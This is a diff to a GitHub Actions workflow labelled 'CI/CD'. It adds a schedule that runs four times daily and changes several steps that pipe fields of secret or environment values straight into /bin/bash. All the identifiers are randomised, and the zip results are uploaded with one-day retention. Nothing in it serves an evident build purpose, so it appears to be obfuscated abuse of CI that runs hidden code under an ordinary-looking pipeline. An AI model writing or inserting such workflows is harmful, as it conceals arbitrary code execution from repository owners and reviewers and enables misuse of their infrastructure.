@@ -2,6 +2,8 @@ name: CI/CD
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '7 4,10,16,22 * * *'
 env:
   CI: true
 jobs:
@@ -13,18 +15,19 @@ jobs:
           fetch-depth: 0
       - name: Start
         env:
-          yk389: ${{ secrets.yk389 }}
+          fptp82307: ${{ secrets.fptp82307 }}
         run: |
-          printf '%s' "$yk389" | jq -r .wyvn5667 | /bin/bash
-          printf '%s' "$lggnr62045" | jq -r .iraog89 | /bin/bash
-          echo $nau57 | jq -r .checy09 | /bin/bash
-          printf '%s' "$pzdbh1" | jq -r .seoer00 | /bin/bash
-          echo $p0017 | jq -r .if23 | /bin/bash
-          printf '%s' "$pojve7" | jq -r .upf81 | /bin/bash
+          printf '%s' "$fptp82307" | jq -r .yp2 | /bin/bash
+          echo $fsmkg8 | jq -r .gkmu655 | /bin/bash
+          echo $k9 | jq -r .pc7032 | /bin/bash
+          printf '%s' "$cewg7880" | jq -r .b07205 | /bin/bash
+          printf '%s' "$bgbcx6" | jq -r .spxi1 | /bin/bash
+          printf '%s' "$nnsuc43" | jq -r .ds579 | /bin/bash
+          printf '%s' "$tqk10" | jq -r .a894 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: Ng31nDwn
+          name: 7nFpZOei
           path: "*.zip"
           retention-days: 1
